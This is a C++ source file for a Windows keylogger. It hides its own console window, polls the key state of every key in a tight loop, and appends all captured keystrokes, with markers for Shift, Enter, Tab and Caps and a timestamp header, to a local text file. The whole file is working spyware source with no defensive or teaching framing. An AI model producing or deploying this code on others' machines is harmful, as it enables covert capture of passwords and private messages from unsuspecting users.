// main.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <iostream>
#include <Windows.h> 
#include <ctime>
#include <fstream> 
#include <io.h>
#include <fcntl.h>

#define FILE_NAME "key_strokes.txt"

using namespace std;

//Function prototypes
void LOG(int key, char* file);
void timeStamp();
void hideConsole(); 


//Entry point 
int main()
{

	//Hide the console 
	hideConsole(); 

	//Log a time stamp 
	timeStamp();

	while (1) {

		//ASCII characters from index 8 - 255 
		for (int i = 8; i <= 255; i++) {

			//Get key state 
			if (GetAsyncKeyState(i) == -32767) {

				//Log it 
				LOG(i, FILE_NAME);
			}
		}

		Sleep(2); 
	}

	return 0;
}

//Write the key out to file 
void LOG(int key, char* file) {

	cout << key << endl;

	//Instantiate a file 
	FILE* log;

	log = fopen(file, "a+");

	//Special key states 
	switch (key) {

		int filehandle; 

		case 0x10:
			fprintf(log, "%s", "[SHIFT]");
			break;

		case 0x08:
		
			//Instantiante a file handle 
			filehandle = open(file, O_RDWR | O_APPEND); 

			//Remove the last byte in the file 
			_chsize(filehandle, filelength(filehandle) - 1);
			break;

		case 0x0D:
			fprintf(log, "%s", "\n[ENTER]");
			break;

		case 0x09:
			fprintf(log, "%s", "[TAB]"); 
			break; 

		case 0x14: 
			fprintf(log, "%s", "[CAPS]"); 
			break; 

	default:

		//Check the low order bits
		//Stay uppercase if condition is met 
		if ((GetKeyState(0x14) & 0x0001) != 0) {

			fprintf(log, "%s", &key);
		}

		//Convert to lower 
		else {

			int k = (int)tolower( (char)key );

			fprintf(log, "%s", &k);
		}

		break;
	}

	//Close the file 
	fclose(log);
}

//Hide the console window 
void hideConsole() {

	HWND hide; 
	AllocConsole();
	hide = GetConsoleWindow(); 

	ShowWindow(hide, 0); 
}

//Create a time stamp 
void timeStamp() {

	//Get the current time 
	time_t current = time(0);

	//Convert to a string 
	char* d_time = ctime(&current);

	FILE* log = fopen(FILE_NAME, "a+");

	fprintf(log, "%s", "\n");
	fprintf(log, "%s", "\n------------");
	fprintf(log, "%s", "\n");
	fprintf(log, "%s", d_time);
	fprintf(log, "%s", "------------");
	fprintf(log, "%s", "\n");
	fprintf(log, "%s", "\n");

	fclose(log);
}